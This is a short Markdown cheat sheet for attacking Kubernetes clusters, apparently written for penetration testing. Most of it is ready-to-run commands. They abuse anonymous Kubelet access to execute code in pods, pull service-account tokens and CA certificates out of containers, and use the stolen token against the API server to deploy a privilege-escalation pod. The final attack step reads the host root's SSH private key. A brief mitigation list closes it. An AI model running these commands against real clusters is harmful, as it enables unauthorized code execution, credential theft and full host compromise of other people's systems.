# Kubernetes

## Kubelet API

```bash
curl https://<node_ip>:10250/pods -k | jq
kubeletctl -i --server <node_ip> pods
kubeletctl -i --server <node_ip> scan rce
kubeletctl -i --server <node_ip> exec "id" -p <pod> -c <container>
```

## Extract Service Account Credentials

```bash
kubeletctl -i --server <node_ip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" \
  -p <pod> -c <container> | tee k8.token

kubeletctl --server <node_ip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" \
  -p <pod> -c <container> | tee ca.crt
```

```bash
export token=$(cat k8.token)
```

## Access API Server With Extracted Token

```bash
kubectl --token=$token --certificate-authority=ca.crt \
  --server=https://<api_ip>:6443 auth can-i --list
```

```bash
kubectl --token=$token --certificate-authority=ca.crt \
  --server=https://<api_ip>:6443 apply -f privesc.yaml
```

```bash
kubectl --token=$token --certificate-authority=ca.crt \
  --server=https://<api_ip>:6443 get pods
```

## Access Host Through Privileged Pod

```bash
kubeletctl --server <node_ip> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

---

## Basic kubectl Enumeration

```bash
kubectl get pods -A
kubectl get svc -A
kubectl get deployments -A
kubectl get ns
kubectl get secrets -A -o yaml
kubectl get sa -A -o yaml
kubectl get roles -A -o yaml
kubectl get rolebindings -A -o yaml
```

---

## Mitigation

* Kubelet anonymous access is a common misconfiguration.
* Extracted tokens can often create new pods or read secrets if RBAC is overly permissive.
* Privileged pods with host mounts allow full host compromise.
* Always disable anonymous Kubelet access and restrict RBAC roles.
